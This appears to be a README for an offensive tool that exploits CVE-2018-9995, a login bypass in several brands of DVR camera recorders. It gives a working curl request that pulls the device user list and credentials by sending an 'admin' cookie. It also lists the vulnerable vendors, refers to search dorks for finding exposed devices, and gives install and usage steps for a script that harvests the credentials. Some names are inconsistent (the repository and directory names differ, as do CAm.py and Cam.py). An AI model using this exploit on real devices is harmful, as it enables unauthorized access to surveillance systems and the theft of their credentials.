[Tool] show DVR Credentiales
[*] Exploit Title:       "CAm" 
[*] CVE:                 CVE-2018-9995
[*] CVSS Base Score v3:  7.3 / 10
[*] CVSS Vector String:  CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
[*] Date:                09/04/2018
[*] Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )
DVR_wall

Exploit:
	$> curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"

tested in DVR (banner/vendor ?):
Novo
CeNova
QSee
Pulnix
XVR 5 in 1 (title: "XVR Login")
Securus,  - Security. Never Compromise !! - 
Night OWL
DVR Login
HVR Login
MDVR Login
On the Wild:
DVR_dorks_0 DVR_dorks_2 DVR_dorks_1 DVR_dorks_3

Possible Banners frontend (web):
DVR_login_1 DVR_login_2 DVR_login_3 DVR_login_4 DVR_login_5 DVR_login_6 DVR_login_7 DVR_login_8 DVR_login_10

Indoor:
DVR_indoor_1 DVR_indoor_2 DVR_indoor_3 DVR_indoor_4 DVR_indoor_5 DVR_indoor_6 DVR_indoor_7

TOOL: "Show all Cam"
Quick start
usr@pwn:~$ git clone https://github.com/YoZSploit/MOrooc/
usr@pwn:~$ cd CVE-2018-9995_dvr_credentials
usr@pwn:~$ pip install -r requirements.txt
help
usage: Cam.py [-h] [-v] --host HOST [--port PORT]

[+] Obtaining Exposed credentials

optional arguments:
  -h, --help     show this help message and exit
  -v, --version  show program's version number and exit
  --host HOST    Host
  --port PORT    Port

[+] Demo: python CAm.py --host 192.168.1.101 -p 81
Pocs (Output) :
DVR_poc_4 DVR_poc_3 DVR_poc_2 DVR_poc_1

Blog:
http://misteralfa-hack.blogspot.cl/2018/04/update-dvr-login-bypass-cve-2018-9995.html

I see you... ! xd
